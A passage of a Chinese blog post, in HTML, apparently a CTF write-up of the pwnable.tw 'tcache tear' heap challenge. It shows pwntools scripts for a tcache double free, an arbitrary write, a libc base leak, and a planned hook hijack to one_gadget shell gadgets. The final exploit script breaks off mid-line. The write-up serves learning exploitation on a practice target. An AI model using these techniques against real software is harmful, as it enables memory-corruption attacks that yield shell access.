@@ -1,0 +1,416 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="男票带我练CTF之tcache tear">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw之tcache tear">
+<meta property="og:url" content="http://blingblingxuanxuan.github.io/2020/03/13/tcachetear/index.html">
+<meta property="og:site_name" content="Clang鱼塘">
+<meta property="og:description" content="男票带我练CTF之tcache tear">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/13/tcachetear/tcachetear1.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/13/tcachetear/tcachetear2.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/13/tcachetear/tcachetear3.png">
+<meta property="article:published_time" content="2020-03-12T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-02-17T05:11:00.713Z">
+<meta property="article:author" content="blingbling">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="tcache">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blingblingxuanxuan.github.io/2020/03/13/tcachetear/tcachetear1.png"><title>pwnable.tw之tcache tear | Clang鱼塘</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2020/03/13/tcachetear/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-feather-alt"></i></span><span class="header-nav-menu-item__text">文章</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/archives/"><span class="header-nav-submenu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-submenu-item__text">归档</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/categories/"><span class="header-nav-submenu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-submenu-item__text">分类</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/tags/"><span class="header-nav-submenu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-submenu-item__text">标签</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-fingerprint"></i></span><span class="header-nav-menu-item__text">关于</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/author/"><span class="header-nav-submenu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-submenu-item__text">作者</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-angle-double-down"></i></span><span class="header-nav-menu-item__text">其他</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/friends/"><span class="header-nav-submenu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-submenu-item__text">友链</span></a></div></div></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Clang鱼塘</div><div class="header-banner-info__subtitle"></div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">pwnable.tw之tcache tear</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2020-03-13</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-02-17</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body"><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://pwnable.tw/challenge/#33" >Tcache tear题目链接</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h1 id="1-分析"   >
+          <a href="#1-分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-分析" class="headerlink" title="1 分析"></a>1 分析</h1>
+      
+        <h2 id="1-1-linux下查看二进制信息"   >
+          <a href="#1-1-linux下查看二进制信息" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-1-linux下查看二进制信息" class="headerlink" title="1.1 linux下查看二进制信息"></a>1.1 linux下查看二进制信息</h2>
+      <figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file tcache_tear</span></span><br><span class="line">tcache_tear: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a273b72984b37439fd6e9a64e86d1c2131948f32, stripped</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> checksec tcache_tear</span></span><br><span class="line">[*] &#x27;/mnt/hgfs/vmshare-1804/Tcache-tear/tcache_tear&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></div></figure>
+<p>可以得到如下信息：</p>
+<ul>
+<li>64位二进制程序，动态链接，去符号表</li>
+<li>got表保护开启，got表不可写</li>
+<li>栈保护开启，栈不可执行，且有canary</li>
+<li>没有开启地址随机化</li>
+</ul>
+
+        <h2 id="1-2-IDA逆向源码逻辑"   >
+          <a href="#1-2-IDA逆向源码逻辑" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-2-IDA逆向源码逻辑" class="headerlink" title="1.2 IDA逆向源码逻辑"></a>1.2 IDA逆向源码逻辑</h2>
+      <p>main中sub_400948()存在一个alarm定时函数，于是将它patch掉。（Edit –&gt; Patch program –&gt;Assemble，全部patch为nop）</p>
+<p>通过IDA分析Tcache tear的源码逻辑如下：</p>
+<p><img src="tcachetear1.png"></p>
+<p>这里的漏洞点在num = 2的分支中，如下代码：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ( v4 &lt;= <span class="number">7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">// free了全局变量ptr指向的堆内存，但并没有将该指针置NULL，导致悬空指针的产生。</span></span><br></pre></td></tr></table></div></figure>
+<p>本题采用的glibc 2.26 (ubuntu 17.10) 版本，为提升堆管理性能，舍弃了很多安全检查。如，对tcache而言，可以不间隔地free两个相同的堆，并添加到tcache链表中。</p>
+<p>本题中，控制Malloc的size在tcache范围内，执行如下命令可形成一个环：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Malloc(size,data);</span><br><span class="line"><span class="built_in">free</span>();</span><br><span class="line"><span class="built_in">free</span>();</span><br></pre></td></tr></table></div></figure>
+<p><img src="tcachetear2.png"></p>
+<p>下次malloc时，tcache将最右边的chunk返回给用户使用，用户可以更改其中的数据，如chunk的fd部分。那么当再一次malloc时，将右数第二个chunk（跟上一个实际是同一chunk）分配给用户。但此时由于fd被更改，下一次mallloc时，就会分配到fd中指定的地址。因此我们便可以在新地址中写一些数据，达到任意地址写的目的。</p>
+<p>接下来，我们触发一下这个漏洞试试，定个小目标，去修改全局变量0x602060处Global_name的值。</p>
+
+        <h2 id="1-3-漏洞触发-任意地址写"   >
+          <a href="#1-3-漏洞触发-任意地址写" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-3-漏洞触发-任意地址写" class="headerlink" title="1.3 漏洞触发 - 任意地址写"></a>1.3 漏洞触发 - 任意地址写</h2>
+      <p>初始化时，Global_name赋值为xiayuan，我的目标是把它改成wangyuxuan，代码如下：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">myelf = ELF(<span class="string">&#x27;tcache_tear&#x27;</span>)</span><br><span class="line">myproc = process(myelf.path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_malloc</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    myproc.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    myproc.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    myproc.sendline(p64(size))</span><br><span class="line">    myproc.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    myproc.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_free</span>():</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    myproc.send(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_info</span>():</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    myproc.send(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_exit</span>():</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    myproc.send(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># Global_name --&gt; xiayuan</span></span><br><span class="line">myproc.recvuntil(<span class="string">&#x27;Name:&#x27;</span>)</span><br><span class="line">myproc.sendline(<span class="string">&#x27;xiayuan&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change Global_name --&gt; wangyuxuan</span></span><br><span class="line">my_malloc(<span class="number">200</span>,<span class="string">&#x27;aaaaaaaaaa&#x27;</span>)</span><br><span class="line">my_free()</span><br><span class="line">my_free()</span><br><span class="line">my_malloc(<span class="number">200</span>,p64(<span class="number">0x602060</span>))</span><br><span class="line">my_malloc(<span class="number">200</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">my_malloc(<span class="number">200</span>,<span class="string">&#x27;wangyuxuan&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(myproc,<span class="string">&#x27;b * 0x00400c02 \nc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">myproc.interactive()</span><br></pre></td></tr></table></div></figure>
+<p>gdb中查看Global_name处的值，成功被改</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/s 0x602060</span><br><span class="line">0x602060:	&quot;wangyuxuan&quot;</span><br></pre></td></tr></table></div></figure>
+
+        <h1 id="2-漏洞利用"   >
+          <a href="#2-漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-漏洞利用" class="headerlink" title="2 漏洞利用"></a>2 漏洞利用</h1>
+      <p>得到一个任意地址写的漏洞，我们通常有一下几种方式利用：</p>
+<ul>
+<li>修改函数指针</li>
+<li>修改got表</li>
+<li>fini_array段函数指针</li>
+<li>libc中的函数指针</li>
+</ul>
+<p>在本题中：</p>
+<ul>
+<li>程序没有自己的函数指针</li>
+<li>got表不可写</li>
+<li>进入main函数后，一直处于while循环，不会执行到fini_array</li>
+</ul>
+<p>因此，我们只能去修改libc中的函数指针，需要：</p>
+<ul>
+<li>泄露libc基址</li>
+<li>利用libc中的函数指针</li>
+</ul>
+
+        <h2 id="2-1-泄露libc基址"   >
+          <a href="#2-1-泄露libc基址" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-1-泄露libc基址" class="headerlink" title="2.1 泄露libc基址"></a>2.1 泄露libc基址</h2>
+      <p>参考hacknote中，unsorted bin的特性。这里需要构造一个会被回收到unsorted bin中的chunk，然后将chunk中相应位置的数据（main_arena的top结构体）读出，减去它跟libc基址的偏移，就可以得到libc基址。</p>
+<p>一个又能被我们写，又能被我们读的位置，就是Global_name处。</p>
+<p>free时除了检查当前块，还要检查nextchunk和nextchunk的nextchunk。因此总共需要构造三个块。</p>
+<p>大小分别为0x500（free时进入usorted bin）, 0x20, 0x20。且需要将他们的inuse位置1，以通过检查。</p>
+<ul>
+<li>main_arena中top结构体距离libc基址的偏移：0x00007f762418fca0 - 0x00007f7623da4000 = 0x3ebca0</li>
+</ul>
+<p><img src="tcachetear3.png"></p>
+<p>泄露libc地址的源码如下：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">myelf = ELF(<span class="string">&#x27;tcache_tear&#x27;</span>)</span><br><span class="line">myproc = process(myelf.path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_malloc</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    myproc.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    myproc.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    myproc.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    myproc.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_free</span>():</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    myproc.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_info</span>():</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    myproc.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_exit</span>():</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    myproc.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">myproc.recvuntil(<span class="string">&#x27;Name:&#x27;</span>)</span><br><span class="line">myproc.sendline(p64(<span class="number">0</span>)+p64(<span class="number">0x501</span>))</span><br><span class="line"></span><br><span class="line">my_malloc(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">my_free()</span><br><span class="line">my_free()</span><br><span class="line">my_malloc(<span class="number">0x50</span>,p64(<span class="number">0x602060</span> + <span class="number">0x500</span>))</span><br><span class="line">my_malloc(<span class="number">0x50</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">my_malloc(<span class="number">0x50</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>))*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">my_malloc(<span class="number">0x70</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">my_free()</span><br><span class="line">my_free()</span><br><span class="line">my_malloc(<span class="number">0x70</span>,p64(<span class="number">0x602060</span> + <span class="number">0x10</span>))</span><br><span class="line">my_malloc(<span class="number">0x70</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">my_malloc(<span class="number">0x70</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free, then get &#x27;top&#x27; addr on 0x602060+0x10</span></span><br><span class="line">my_free()</span><br><span class="line"></span><br><span class="line"><span class="comment"># calc libc_addr</span></span><br><span class="line">my_info()</span><br><span class="line">myproc.recv(<span class="string">&#x27;Name :&#x27;</span>)</span><br><span class="line">myproc.recv(<span class="number">0x10</span>)</span><br><span class="line">libc_addr = u64(myproc.recv(<span class="number">0x8</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"></span><br><span class="line">gdb.attach(myproc,<span class="string">&#x27;b * 0x00400c02 \nc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">myproc.interactive()</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h2 id="2-2-控制libc中的函数指针"   >
+          <a href="#2-2-控制libc中的函数指针" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-2-控制libc中的函数指针" class="headerlink" title="2.2 控制libc中的函数指针"></a>2.2 控制libc中的函数指针</h2>
+      <p>libc中存在一些导出的hook函数指针：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> strings libc-123.so | grep hook</span></span><br><span class="line">__malloc_initialize_hook</span><br><span class="line">_dl_open_hook</span><br><span class="line">argp_program_version_hook</span><br><span class="line">__after_morecore_hook</span><br><span class="line">__memalign_hook</span><br><span class="line">__malloc_hook</span><br><span class="line">__free_hook</span><br><span class="line">_dl_open_hook2</span><br><span class="line">__realloc_hook</span><br></pre></td></tr></table></div></figure>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/0d7aa3166eec" >malloc hook初探</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>根据这些hook函数的特性（malloc之前会调用<code>__malloc_hook</code>，free之前会调用<code>__free_hook</code>），我们可以劫持这些函数指针，来执行system函数或者one_gadget。</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> one_gadget libc-123.so</span> </span><br><span class="line">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></div></figure>
+
+        <h1 id="3-EXP"   >
+          <a href="#3-EXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-EXP" class="headerlink" title="3 EXP"></a>3 EXP</h1>
+      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">myelf = ELF(<span class="string">&#x27;tcache_tear&#x27;</span>)</span><br><span class="line">mylibc = ELF(<span class="string">&#x27;libc-123.so&#x27;</span>)</span><br><span class="line">myproc = process(myelf.path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_malloc</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    myproc.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    myproc.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    myproc.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    myproc.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_free</span>():</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    myproc.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_info</span>():</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    myproc.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_exit</span>():</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    myproc.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">myproc.recvuntil(<span class="string">&#x27;Name:&#x27;</span>)</span><br><span class="line">myproc.sendline(p64(<span class="number">0</span>)+p64(<span class="number">0x501</span>))</span><br><span class="line"></span><br><span class="line">my_malloc(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">my_free()</span><br><span class="line">my_free()</span><br><span class="line">my_malloc(<span class="number">0x50</span>,p64(<span class="number">0x602060</span> + <span class="number">0x500</span>))</span><br><span class="line">my_malloc(<span class="number">0x50</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">my_malloc(<span class="number">0x50</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>))*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">my_malloc(<span class="number">0x70</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">my_free()</span><br><span class="line">my_free()</span><br><span class="line">my_malloc(<span class="number">0x70</span>,p64(<span class="number">0x602060</span> + <span class="number">0x10</span>))</span><br><span class="line">my_malloc(<span class="number">0x70</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">my_malloc(<span class="number">0x70</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free, then get &#x27;top&#x27; 